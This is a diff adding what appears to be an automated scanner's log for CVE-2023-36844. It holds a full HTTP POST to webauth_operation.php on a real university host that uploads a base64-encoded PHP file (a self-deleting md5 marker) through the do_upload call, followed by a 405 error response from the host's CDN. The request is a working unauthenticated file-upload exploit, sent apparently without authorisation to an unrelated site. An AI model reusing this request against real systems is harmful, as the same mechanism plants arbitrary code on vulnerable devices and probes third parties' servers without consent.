@@ -1,0 +1,42 @@
+[CVE-2023-36844] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/webauth_operation.php
+
+
+POST /webauth_operation.php HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 176
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+rs=do_upload&rsargs[]=[{"fileData": "data:text/html;base64,KCc8P3BocCBlY2hvIG1kNSgnQ1ZFLTIwMjMtMzY4NDQnKTt1bmxpbmsoX19GSUxFX18pOz8+Jyk=", "fileName": "cacbb.php", "csize": 56}]
+[CVE-2023-36844] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/webauth_operation.php
+
+HTTP/1.1 405 Method Not Allowed
+Connection: close
+Content-Length: 422
+Allow: GET, HEAD, OPTIONS
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:19:01 GMT
+Server: AmazonS3
+Via: 1.1 978b1b29b70b082668c3d920b0bbe7d4.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: FHxcWv1gX0G_tiMt5YXp3iG7_a_eH5YqYuHyaL2zHDSd_CZEpaV3sA==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>405 Method Not Allowed</title></head>
+<body>
+<h1>405 Method Not Allowed</h1>
+<ul>
+<li>Code: MethodNotAllowed</li>
+<li>Message: The specified method is not allowed against this resource.</li>
+<li>Method: POST</li>
+<li>ResourceType: OBJECT</li>
+<li>RequestId: X4B2997X80GG253W</li>
+<li>HostId: 0EeYEfQ7iYheE/fZhxvlQkcqT+st/XCql4xQ4fbk6t0JxwyUgdDKSuRe8FWfvb1QSG79B6UR+0A=</li>
+</ul>
+<hr/>
+</body>
+</html>
+
